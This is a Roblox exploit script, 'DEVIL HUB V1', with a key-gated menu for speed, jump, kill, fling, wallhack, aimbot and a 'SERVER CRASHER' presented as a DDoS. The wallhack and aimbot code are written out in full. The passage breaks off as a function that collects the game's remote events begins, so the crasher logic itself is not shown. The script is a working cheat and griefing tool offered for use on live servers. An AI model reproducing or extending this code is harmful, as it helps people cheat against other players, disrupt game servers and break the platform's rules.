local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")
local ScrollFrame = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")

local SpeedButton = Instance.new("TextButton")
local JumpButton = Instance.new("TextButton")
local KillButton = Instance.new("TextButton")
local FlingButton = Instance.new("TextButton")
local WallhackButton = Instance.new("TextButton")
local AimbotButton = Instance.new("TextButton")
local AC6Button = Instance.new("TextButton")
local DDoSButton = Instance.new("TextButton")
local StatusLabel = Instance.new("TextLabel")
local DiscordLabel = Instance.new("TextLabel")

local player = game.Players.LocalPlayer
local camera = game.Workspace.CurrentCamera
local mouse = player:GetMouse()
local runService = game:GetService("RunService")
local userInputService = game:GetService("UserInputService")

local isMobile = userInputService.TouchEnabled and not userInputService.KeyboardEnabled

ScreenGui.Name = "DEVILHUB"
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

local guiWidth = isMobile and 220 or 450
local guiHeight = isMobile and 400 or 700
local buttonHeight = isMobile and 40 or 55
local fontSize = isMobile and 12 or 20
local titleSize = isMobile and 16 or 24

local KeyFrame = Instance.new("Frame")
KeyFrame.Name = "KeyFrame"
KeyFrame.Parent = ScreenGui
KeyFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 30)
KeyFrame.BorderSizePixel = 0
KeyFrame.Position = UDim2.new(0.5, -guiWidth/2, 0.5, -guiHeight/2)
KeyFrame.Size = UDim2.new(0, guiWidth, 0, guiHeight)
KeyFrame.Active = true
KeyFrame.Draggable = not isMobile
KeyFrame.ClipsDescendants = true

local KeyCorner = Instance.new("UICorner")
KeyCorner.CornerRadius = UDim.new(0, 10)
KeyCorner.Parent = KeyFrame

local KeyShadow = Instance.new("ImageLabel")
KeyShadow.Name = "Shadow"
KeyShadow.Parent = KeyFrame
KeyShadow.BackgroundTransparency = 1
KeyShadow.Position = UDim2.new(0, -6, 0, -6)
KeyShadow.Size = UDim2.new(1, 12, 1, 12)
KeyShadow.Image = "rbxassetid://1316045217"
KeyShadow.ImageColor3 = Color3.fromRGB(60, 0, 80)
KeyShadow.ImageTransparency = 0.4
KeyShadow.ScaleType = Enum.ScaleType.Slice
KeyShadow.SliceCenter = Rect.new(10, 10, 118, 118)

local KeyTitle = Instance.new("TextLabel")
KeyTitle.Parent = KeyFrame
KeyTitle.BackgroundColor3 = Color3.fromRGB(45, 0, 75)
KeyTitle.BorderSizePixel = 0
KeyTitle.Size = UDim2.new(1, 0, 0, isMobile and 30 or 50)
KeyTitle.Font = Enum.Font.GothamBold
KeyTitle.Text = "DEVIL HUB V1 - KEY REQUIRED"
KeyTitle.TextColor3 = Color3.fromRGB(200, 150, 255)
KeyTitle.TextSize = titleSize
KeyTitle.BackgroundTransparency = 0.2

local KeyTitleGradient = Instance.new("UIGradient")
KeyTitleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 0, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 0, 100))
})
KeyTitleGradient.Rotation = 90
KeyTitleGradient.Parent = KeyTitle

local KeyTitleCorner = Instance.new("UICorner")
KeyTitleCorner.CornerRadius = UDim.new(0, 10)
KeyTitleCorner.Parent = KeyTitle

local KeyEntryLabel = Instance.new("TextLabel")
KeyEntryLabel.Parent = KeyFrame
KeyEntryLabel.BackgroundTransparency = 1
KeyEntryLabel.Position = UDim2.new(0, 10, 0.5, -40)
KeyEntryLabel.Size = UDim2.new(1, -20, 0, 20)
KeyEntryLabel.Font = Enum.Font.GothamBold
KeyEntryLabel.Text = "ENTER KEY"
KeyEntryLabel.TextColor3 = Color3.fromRGB(200, 150, 255)
KeyEntryLabel.TextSize = fontSize

local KeyTextBox = Instance.new("TextBox")
KeyTextBox.Parent = KeyFrame
KeyTextBox.BackgroundColor3 = Color3.fromRGB(30, 0, 40)
KeyTextBox.BorderSizePixel = 0
KeyTextBox.Position = UDim2.new(0.1, 0, 0.5, -20)
KeyTextBox.Size = UDim2.new(0.8, 0, 0, buttonHeight)
KeyTextBox.Font = Enum.Font.Gotham
KeyTextBox.Text = ""
KeyTextBox.PlaceholderText = "Enter Key"
KeyTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyTextBox.PlaceholderColor3 = Color3.fromRGB(150, 100, 200)
KeyTextBox.TextSize = fontSize
KeyTextBox.ClearTextOnFocus = false

local KeyTextBoxCorner = Instance.new("UICorner")
KeyTextBoxCorner.CornerRadius = UDim.new(0, 5)
KeyTextBoxCorner.Parent = KeyTextBox

local EnterButton = Instance.new("TextButton")
EnterButton.Parent = KeyFrame
EnterButton.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
EnterButton.BorderSizePixel = 0
EnterButton.Position = UDim2.new(0.1, 0, 0.6, 20)
EnterButton.Size = UDim2.new(0.8, 0, 0, buttonHeight)
EnterButton.Font = Enum.Font.GothamBold
EnterButton.Text = "ENTER"
EnterButton.TextColor3 = Color3.fromRGB(255, 255, 255)
EnterButton.TextSize = fontSize
EnterButton.AutoButtonColor = false

local EnterButtonCorner = Instance.new("UICorner")
EnterButtonCorner.CornerRadius = UDim.new(0, 5)
EnterButtonCorner.Parent = EnterButton

local DiscordButton = Instance.new("TextButton")
DiscordButton.Parent = KeyFrame
DiscordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
DiscordButton.BorderSizePixel = 0
DiscordButton.Position = UDim2.new(0.1, 0, 0.7, 20)
DiscordButton.Size = UDim2.new(0.8, 0, 0, buttonHeight)
DiscordButton.Font = Enum.Font.GothamBold
DiscordButton.Text = "JOIN DISCORD"
DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordButton.TextSize = fontSize
DiscordButton.AutoButtonColor = false

local DiscordButtonCorner = Instance.new("UICorner")
DiscordButtonCorner.CornerRadius = UDim.new(0, 5)
DiscordButtonCorner.Parent = DiscordButton

DiscordButton.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/SNZaMv4Aw2")
end)

if isMobile then
    DiscordButton.TouchTap:Connect(function()
        setclipboard("https://discord.gg/SNZaMv4Aw2")
    end)
end

local KeyErrorLabel = Instance.new("TextLabel")
KeyErrorLabel.Parent = KeyFrame
KeyErrorLabel.BackgroundTransparency = 1
KeyErrorLabel.Position = UDim2.new(0, 10, 0.8, 10)
KeyErrorLabel.Size = UDim2.new(1, -20, 0, 20)
KeyErrorLabel.Font = Enum.Font.Gotham
KeyErrorLabel.Text = ""
KeyErrorLabel.TextColor3 = Color3.fromRGB(255, 100, 150)
KeyErrorLabel.TextSize = isMobile and 8 or 14

local function checkKey()
    if KeyTextBox.Text == "47215" then
        KeyFrame.Visible = false
        MainFrame.Visible = true
    else
        KeyErrorLabel.Text = "Invalid Key"
    end
end

KeyTextBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        checkKey()
    end
end)

EnterButton.MouseButton1Click:Connect(function()
    checkKey()
end)

if isMobile then
    EnterButton.TouchTap:Connect(function()
        checkKey()
    end)
end

MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.5, -guiWidth/2, 0.5, -guiHeight/2)
MainFrame.Size = UDim2.new(0, guiWidth, 0, guiHeight)
MainFrame.Active = true
MainFrame.Draggable = not isMobile
MainFrame.ClipsDescendants = true
MainFrame.Visible = false

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 10)
Corner.Parent = MainFrame

local Shadow = Instance.new("ImageLabel")
Shadow.Name = "Shadow"
Shadow.Parent = MainFrame
Shadow.BackgroundTransparency = 1
Shadow.Position = UDim2.new(0, -6, 0, -6)
Shadow.Size = UDim2.new(1, 12, 1, 12)
Shadow.Image = "rbxassetid://1316045217"
Shadow.ImageColor3 = Color3.fromRGB(60, 0, 80)
Shadow.ImageTransparency = 0.4
Shadow.ScaleType = Enum.ScaleType.Slice
Shadow.SliceCenter = Rect.new(10, 10, 118, 118)

Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundColor3 = Color3.fromRGB(45, 0, 75)
Title.BorderSizePixel = 0
Title.Size = UDim2.new(1, 0, 0, isMobile and 30 or 50)
Title.Font = Enum.Font.GothamBold
Title.Text = "DEVIL HUB V1"
Title.TextColor3 = Color3.fromRGB(200, 150, 255)
Title.TextSize = titleSize
Title.BackgroundTransparency = 0.2

local TitleGradient = Instance.new("UIGradient")
TitleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 0, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 0, 100))
})
TitleGradient.Rotation = 90
TitleGradient.Parent = Title

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 10)
TitleCorner.Parent = Title

CloseButton.Name = "CloseButton"
CloseButton.Parent = MainFrame
CloseButton.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
CloseButton.BorderSizePixel = 0
CloseButton.Position = UDim2.new(1, -(isMobile and 26 or 45), 0, isMobile and 3 or 10)
CloseButton.Size = UDim2.new(0, isMobile and 20 or 35, 0, isMobile and 20 or 35)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 200, 255)
CloseButton.TextSize = isMobile and 12 or 20
CloseButton.AutoButtonColor = false

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 6)
CloseCorner.Parent = CloseButton

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

CloseButton.MouseEnter:Connect(function()
    if not isMobile then
        CloseButton.BackgroundColor3 = Color3.fromRGB(180, 0, 90)
    end
end)

CloseButton.MouseLeave:Connect(function()
    if not isMobile then
        CloseButton.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
    end
end)

CloseButton.TouchTap:Connect(function()
    ScreenGui:Destroy()
end)

ScrollFrame.Name = "ScrollFrame"
ScrollFrame.Parent = MainFrame
ScrollFrame.BackgroundColor3 = Color3.fromRGB(25, 0, 35)
ScrollFrame.BorderSizePixel = 0
ScrollFrame.Position = UDim2.new(0, 4, 0, isMobile and 34 or 65)
ScrollFrame.Size = UDim2.new(1, -8, 1, -(isMobile and 80 or 170))
ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollFrame.ScrollBarThickness = isMobile and 2 or 8
ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(140, 0, 255)
ScrollFrame.BackgroundTransparency = 0.3
ScrollFrame.ScrollingEnabled = true

local ScrollCorner = Instance.new("UICorner")
ScrollCorner.CornerRadius = UDim.new(0, 6)
ScrollCorner.Parent = ScrollFrame

UIListLayout.Parent = ScrollFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, isMobile and 4 or 12)
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local AimbotRadiusFrame = Instance.new("Frame")
AimbotRadiusFrame.Parent = ScrollFrame
AimbotRadiusFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 40)
AimbotRadiusFrame.BorderSizePixel = 0
AimbotRadiusFrame.Size = UDim2.new(1, -8, 0, isMobile and 42 or 60)
AimbotRadiusFrame.BackgroundTransparency = 0.2

local RadiusCorner = Instance.new("UICorner")
RadiusCorner.CornerRadius = UDim.new(0, 5)
RadiusCorner.Parent = AimbotRadiusFrame

local RadiusLabel = Instance.new("TextLabel")
RadiusLabel.Parent = AimbotRadiusFrame
RadiusLabel.BackgroundTransparency = 1
RadiusLabel.Size = UDim2.new(1, -12, 0, 14)
RadiusLabel.Position = UDim2.new(0, 4, 0, 2)
RadiusLabel.Font = Enum.Font.Gotham
RadiusLabel.Text = "Aimbot Circle Size"
RadiusLabel.TextColor3 = Color3.fromRGB(200, 150, 255)
RadiusLabel.TextSize = isMobile and 9 or 14
RadiusLabel.TextXAlignment = Enum.TextXAlignment.Left

local RadiusValue = Instance.new("TextLabel")
RadiusValue.Parent = AimbotRadiusFrame
RadiusValue.BackgroundTransparency = 1
RadiusValue.Size = UDim2.new(0, 30, 0, 14)
RadiusValue.Position = UDim2.new(1, -34, 0, 2)
RadiusValue.Font = Enum.Font.GothamBold
RadiusValue.Text = "150"
RadiusValue.TextColor3 = Color3.fromRGB(255, 255, 255)
RadiusValue.TextSize = isMobile and 9 or 14

local RadiusSlider = Instance.new("Frame")
RadiusSlider.Parent = AimbotRadiusFrame
RadiusSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
RadiusSlider.BorderSizePixel = 0
RadiusSlider.Position = UDim2.new(0, 4, 0, 20)
RadiusSlider.Size = UDim2.new(1, -8, 0, isMobile and 14 or 15)

local SliderCorner = Instance.new("UICorner")
SliderCorner.CornerRadius = UDim.new(1, 0)
SliderCorner.Parent = RadiusSlider

local SliderButton = Instance.new("TextButton")
SliderButton.Name = "RadiusSliderButton"
SliderButton.Parent = RadiusSlider
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SliderButton.BorderSizePixel = 0
SliderButton.Position = UDim2.new(0, 0, 0, 0)
SliderButton.Size = UDim2.new(0, isMobile and 16 or 20, 1, 0)
SliderButton.Text = ""

local SliderButtonCorner = Instance.new("UICorner")
SliderButtonCorner.CornerRadius = UDim.new(1, 0)
SliderButtonCorner.Parent = SliderButton

local DDoSTimeFrame = Instance.new("Frame")
DDoSTimeFrame.Parent = ScrollFrame
DDoSTimeFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 40)
DDoSTimeFrame.BorderSizePixel = 0
DDoSTimeFrame.Size = UDim2.new(1, -8, 0, isMobile and 42 or 60)
DDoSTimeFrame.BackgroundTransparency = 0.2

local TimeCorner = Instance.new("UICorner")
TimeCorner.CornerRadius = UDim.new(0, 5)
TimeCorner.Parent = DDoSTimeFrame

local TimeLabel = Instance.new("TextLabel")
TimeLabel.Parent = DDoSTimeFrame
TimeLabel.BackgroundTransparency = 1
TimeLabel.Size = UDim2.new(1, -12, 0, 14)
TimeLabel.Position = UDim2.new(0, 4, 0, 2)
TimeLabel.Font = Enum.Font.Gotham
TimeLabel.Text = "DDoS Duration (sec)"
TimeLabel.TextColor3 = Color3.fromRGB(200, 150, 255)
TimeLabel.TextSize = isMobile and 9 or 14
TimeLabel.TextXAlignment = Enum.TextXAlignment.Left

local TimeValue = Instance.new("TextLabel")
TimeValue.Parent = DDoSTimeFrame
TimeValue.BackgroundTransparency = 1
TimeValue.Size = UDim2.new(0, 30, 0, 14)
TimeValue.Position = UDim2.new(1, -34, 0, 2)
TimeValue.Font = Enum.Font.GothamBold
TimeValue.Text = "30"
TimeValue.TextColor3 = Color3.fromRGB(255, 255, 255)
TimeValue.TextSize = isMobile and 9 or 14

local TimeSlider = Instance.new("Frame")
TimeSlider.Parent = DDoSTimeFrame
TimeSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
TimeSlider.BorderSizePixel = 0
TimeSlider.Position = UDim2.new(0, 4, 0, 20)
TimeSlider.Size = UDim2.new(1, -8, 0, isMobile and 14 or 15)

local TimeSliderCorner = Instance.new("UICorner")
TimeSliderCorner.CornerRadius = UDim.new(1, 0)
TimeSliderCorner.Parent = TimeSlider

local TimeSliderButton = Instance.new("TextButton")
TimeSliderButton.Name = "TimeSliderButton"
TimeSliderButton.Parent = TimeSlider
TimeSliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TimeSliderButton.BorderSizePixel = 0
TimeSliderButton.Position = UDim2.new(0, 0, 0, 0)
TimeSliderButton.Size = UDim2.new(0, isMobile and 16 or 20, 1, 0)
TimeSliderButton.Text = ""

local TimeSliderButtonCorner = Instance.new("UICorner")
TimeSliderButtonCorner.CornerRadius = UDim.new(1, 0)
TimeSliderButtonCorner.Parent = TimeSliderButton

local function createButton(name)
    local button = Instance.new("TextButton")
    button.Name = name .. "Button"
    button.Parent = ScrollFrame
    button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    button.BorderSizePixel = 0
    button.Size = UDim2.new(1, -8, 0, buttonHeight)
    button.Font = Enum.Font.GothamBold
    button.Text = name
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = fontSize
    button.AutoButtonColor = false
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 5)
    btnCorner.Parent = button
    
    if not isMobile then
        button.MouseEnter:Connect(function()
            button:TweenSize(UDim2.new(1, -6, 0, buttonHeight + 5), "Out", "Quad", 0.2)
        end)
        
        button.MouseLeave:Connect(function()
            button:TweenSize(UDim2.new(1, -8, 0, buttonHeight), "Out", "Quad", 0.2)
        end)
    end
    
    return button
end

SpeedButton = createButton("SPEED")
JumpButton = createButton("JUMP")
KillButton = createButton("KILL")
FlingButton = createButton("FLING")
WallhackButton = createButton("WALLHACK")
AimbotButton = createButton("AIMBOT")
AC6Button = createButton("AC6 SOUND")
DDoSButton = createButton("SERVER CRASHER")

StatusLabel.Parent = MainFrame
StatusLabel.BackgroundColor3 = Color3.fromRGB(30, 0, 45)
StatusLabel.BorderSizePixel = 0
StatusLabel.Position = UDim2.new(0, 4, 1, -(isMobile and 34 or 70))
StatusLabel.Size = UDim2.new(1, -8, 0, isMobile and 22 or 55)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.Text = "Status: Devil Ready"
StatusLabel.TextColor3 = Color3.fromRGB(200, 150, 255)
StatusLabel.TextSize = isMobile and 8 or 16
StatusLabel.BackgroundTransparency = 0.3

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(0, 5)
StatusCorner.Parent = StatusLabel

local StatusGradient = Instance.new("UIGradient")
StatusGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(75, 0, 130)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 0, 75))
})
StatusGradient.Rotation = 90
StatusGradient.Parent = StatusLabel

DiscordLabel.Parent = MainFrame
DiscordLabel.BackgroundColor3 = Color3.fromRGB(20, 0, 30)
DiscordLabel.BorderSizePixel = 0
DiscordLabel.Position = UDim2.new(0, 4, 1, -(isMobile and 10 or 20))
DiscordLabel.Size = UDim2.new(1, -8, 0, isMobile and 10 or 20)
DiscordLabel.Font = Enum.Font.Gotham
DiscordLabel.Text = "discord : sibertank."
DiscordLabel.TextColor3 = Color3.fromRGB(150, 100, 200)
DiscordLabel.TextSize = isMobile and 7 or 12
DiscordLabel.BackgroundTransparency = 1

ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 50)

UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 60)
end)

local speedEnabled = false
local jumpEnabled = false
local wallhackEnabled = false
local aimbotEnabled = false
local ddosActive = false

local originalSpeed = 16
local originalJump = 50
local currentSpeed = 120
local currentJump = 250
local aimbotRadius = 150
local aimbotSmoothness = 0.3
local ddosDuration = 30

local espHighlights = {}
local aimbotCircle = nil
local aimbotConnection = nil
local ddosThreads = {}
local ddosEndTime = 0

local function updateStatus(text, isError)
    StatusLabel.Text = "Status: " .. text
    StatusLabel.TextColor3 = isError and Color3.fromRGB(255, 100, 150) or Color3.fromRGB(180, 100, 255)
end

local function createAimbotCircle()
    if aimbotCircle then aimbotCircle:Destroy() end
    aimbotCircle = Drawing.new("Circle")
    aimbotCircle.Visible = false
    aimbotCircle.Thickness = 3
    aimbotCircle.NumSides = 64
    aimbotCircle.Radius = aimbotRadius
    aimbotCircle.Color = Color3.fromRGB(255, 0, 255)
    aimbotCircle.Filled = false
    aimbotCircle.Transparency = 1
    aimbotCircle.Position = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
end

local function updateAimbotRadius(newRadius)
    aimbotRadius = newRadius
    RadiusValue.Text = tostring(math.floor(aimbotRadius))
    if aimbotCircle then
        aimbotCircle.Radius = aimbotRadius
    end
end

local function updateDDoSTime(newTime)
    ddosDuration = math.floor(newTime)
    TimeValue.Text = tostring(ddosDuration)
end

SliderButton.MouseButton1Down:Connect(function()
    local connection
    connection = userInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            local pos = math.clamp((input.Position.X - RadiusSlider.AbsolutePosition.X) / RadiusSlider.AbsoluteSize.X, 0, 1)
            SliderButton.Position = UDim2.new(pos, 0, 0, 0)
            local newRadius = 50 + (pos * 450)
            updateAimbotRadius(newRadius)
        end
    end)
    
    userInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            connection:Disconnect()
        end
    end)
end)

TimeSliderButton.MouseButton1Down:Connect(function()
    local connection
    connection = userInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            local pos = math.clamp((input.Position.X - TimeSlider.AbsolutePosition.X) / TimeSlider.AbsoluteSize.X, 0, 1)
            TimeSliderButton.Position = UDim2.new(pos, 0, 0, 0)
            local newTime = 5 + (pos * 115)
            updateDDoSTime(newTime)
        end
    end)
    
    userInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            connection:Disconnect()
        end
    end)
end)

if isMobile then
    SliderButton.TouchTap:Connect(function()
    end)
    TimeSliderButton.TouchTap:Connect(function()
    end)
end

local function getTeamColor(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return Color3.fromRGB(255, 0, 0) end
    local success, result = pcall(function()
        if player.Team and targetPlayer.Team then
            return player.Team == targetPlayer.Team
        end
        return false
    end)
    return (success and result) and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
end

local function clearESP()
    for _, highlight in pairs(espHighlights) do
        if highlight then
            pcall(function()
                highlight:Destroy()
            end)
        end
    end
    espHighlights = {}
end

local function createHighlightForPlayer(targetPlayer)
    if espHighlights[targetPlayer] or targetPlayer == player then return end
    
    if targetPlayer.Character then
        local highlight = Instance.new("Highlight")
        highlight.Name = "DevilESP"
        highlight.Parent = targetPlayer.Character
        highlight.FillColor = getTeamColor(targetPlayer)
        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
        highlight.FillTransparency = 0.3
        highlight.OutlineTransparency = 0
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        
        espHighlights[targetPlayer] = highlight
    end
    
    targetPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        if wallhackEnabled and targetPlayer ~= player then
            local newHighlight = Instance.new("Highlight")
            newHighlight.Name = "DevilESP"
            newHighlight.Parent = targetPlayer.Character
            newHighlight.FillColor = getTeamColor(targetPlayer)
            newHighlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            newHighlight.FillTransparency = 0.3
            newHighlight.OutlineTransparency = 0
            newHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            espHighlights[targetPlayer] = newHighlight
        end
    end)
end

local function toggleWallhack(state)
    clearESP()
    
    if not state then
        updateStatus("Wallhack Disabled")
        return
    end
    
    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player then
            createHighlightForPlayer(otherPlayer)
        end
    end
    
    game.Players.PlayerAdded:Connect(function(newPlayer)
        if newPlayer ~= player then
            task.wait(1)
            createHighlightForPlayer(newPlayer)
        end
    end)
    
    runService.RenderStepped:Connect(function()
        if wallhackEnabled then
            for otherPlayer, highlight in pairs(espHighlights) do
                if otherPlayer and otherPlayer.Character and highlight then
                    highlight.FillColor = getTeamColor(otherPlayer)
                end
            end
        end
    end)
    
    updateStatus("Wallhack Active")
end

local function getClosestTarget()
    local closest = nil
    local shortestDistance = aimbotRadius
    local mousePos = Vector2.new(mouse.X, mouse.Y)
    
    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character then
            local character = otherPlayer.Character
            local humanoid = character:FindFirstChild("Humanoid")
            local head = character:FindFirstChild("Head")
            
            if humanoid and humanoid.Health > 0 and head then
                local headPos, onScreen = camera:WorldToViewportPoint(head.Position)
                
                if onScreen then
                    local screenPos = Vector2.new(headPos.X, headPos.Y)
                    local distance = (screenPos - mousePos).Magnitude
                    
                    if distance < shortestDistance then
                        local isEnemy = true
                        local success, result = pcall(function()
                            if player.Team and otherPlayer.Team then
                                return player.Team ~= otherPlayer.Team
                            end
                            return true
                        end)
                        
                        if success then
                            isEnemy = result
                        end
                        
                        if isEnemy then
                            shortestDistance = distance
                            closest = otherPlayer
                        end
                    end
                end
            end
        end
    end
    
    return closest
end

local function toggleAimbot(state)
    if aimbotConnection then
        aimbotConnection:Disconnect()
        aimbotConnection = nil
    end
    
    if aimbotCircle then
        aimbotCircle.Visible = state
        aimbotCircle.Radius = aimbotRadius
    else
        createAimbotCircle()
        aimbotCircle.Visible = state
        aimbotCircle.Radius = aimbotRadius
    end
    
    if not state then
        updateStatus("Aimbot Disabled")
        return
    end
    
    aimbotConnection = runService.RenderStepped:Connect(function()
        if not aimbotCircle then 
            createAimbotCircle() 
            aimbotCircle.Radius = aimbotRadius
        end
        aimbotCircle.Position = Vector2.new(mouse.X, mouse.Y)
        aimbotCircle.Radius = aimbotRadius
        aimbotCircle.Visible = aimbotEnabled
        
        local target = getClosestTarget()
        
        if target and target.Character and target.Character:FindFirstChild("Head") then
            local head = target.Character.Head
            local targetPos = head.Position
            local currentPos = camera.CFrame.Position
            camera.CFrame = CFrame.new(currentPos, targetPos)
            aimbotCircle.Color = Color3.fromRGB(0, 255, 0)
        else
            aimbotCircle.Color = Color3.fromRGB(255, 0, 255)
        end
    end)
    
    updateStatus("Aimbot Active (Smooth)")
end

local function showPlayerList(callback)
    local listGui = Instance.new("ScreenGui")
    listGui.Parent = game.CoreGui
    listGui.Name = "DevilList"
    
    local listWidth = isMobile and 190 or 400
    local listHeight = isMobile and 300 or 500
    
    local listFrame = Instance.new("Frame")
    listFrame.Parent = listGui
    listFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 30)
    listFrame.BorderSizePixel = 0
    listFrame.Position = UDim2.new(0.5, -listWidth/2, 0.5, -listHeight/2)
    listFrame.Size = UDim2.new(0, listWidth, 0, listHeight)
    listFrame.Active = true
    
    local listCorner = Instance.new("UICorner")
    listCorner.CornerRadius = UDim.new(0, 8)
    listCorner.Parent = listFrame
    
    local listTitle = Instance.new("TextLabel")
    listTitle.Parent = listFrame
    listTitle.BackgroundColor3 = Color3.fromRGB(45, 0, 75)
    listTitle.BorderSizePixel = 0
    listTitle.Size = UDim2.new(1, 0, 0, isMobile and 30 or 50)
    listTitle.Font = Enum.Font.GothamBold
    listTitle.Text = "Select Target"
    listTitle.TextColor3 = Color3.fromRGB(200, 150, 255)
    listTitle.TextSize = isMobile and 14 or 22
    
    local listClose = Instance.new("TextButton")
    listClose.Parent = listFrame
    listClose.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
    listClose.BorderSizePixel = 0
    listClose.Position = UDim2.new(1, -(isMobile and 26 or 45), 0, isMobile and 3 or 10)
    listClose.Size = UDim2.new(0, isMobile and 20 or 35, 0, isMobile and 20 or 35)
    listClose.Font = Enum.Font.GothamBold
    listClose.Text = "X"
    listClose.TextColor3 = Color3.fromRGB(255, 200, 255)
    listClose.TextSize = isMobile and 12 or 20
    
    local listCloseCorner = Instance.new("UICorner")
    listCloseCorner.CornerRadius = UDim.new(0, 5)
    listCloseCorner.Parent = listClose
    
    listClose.MouseButton1Click:Connect(function()
        listGui:Destroy()
    end)
    
    if isMobile then
        listClose.TouchTap:Connect(function()
            listGui:Destroy()
        end)
    end
    
    local listScroll = Instance.new("ScrollingFrame")
    listScroll.Parent = listFrame
    listScroll.BackgroundColor3 = Color3.fromRGB(25, 0, 35)
    listScroll.BorderSizePixel = 0
    listScroll.Position = UDim2.new(0, 4, 0, isMobile and 34 or 65)
    listScroll.Size = UDim2.new(1, -8, 1, -(isMobile and 50 or 90))
    listScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    listScroll.ScrollBarThickness = isMobile and 2 or 8
    listScroll.ScrollBarImageColor3 = Color3.fromRGB(140, 0, 255)
    
    local listLayout = Instance.new("UIListLayout")
    listLayout.Parent = listScroll
    listLayout.SortOrder = Enum.SortOrder.Name
    listLayout.Padding = UDim.new(0, isMobile and 3 or 8)
    listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    
    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player then
            local playerButton = Instance.new("TextButton")
            playerButton.Parent = listScroll
            playerButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            playerButton.BorderSizePixel = 0
            playerButton.Size = UDim2.new(1, -8, 0, isMobile and 30 or 45)
            playerButton.Font = Enum.Font.Gotham
            playerButton.Text = otherPlayer.Name
            playerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            playerButton.TextSize = isMobile and 10 or 18
            
            local btnCorner = Instance.new("UICorner")
            btnCorner.CornerRadius = UDim.new(0, 4)
            btnCorner.Parent = playerButton
            
            playerButton.MouseButton1Click:Connect(function()
                callback(otherPlayer)
                listGui:Destroy()
            end)
            
            if isMobile then
                playerButton.TouchTap:Connect(function()
                    callback(otherPlayer)
                    listGui:Destroy()
                end)
            end
        end
    end
    
    listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        listScroll.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 12)
    end)
end

local allRemotes = {}

local function findAllRemotes()
    allRemotes = {}
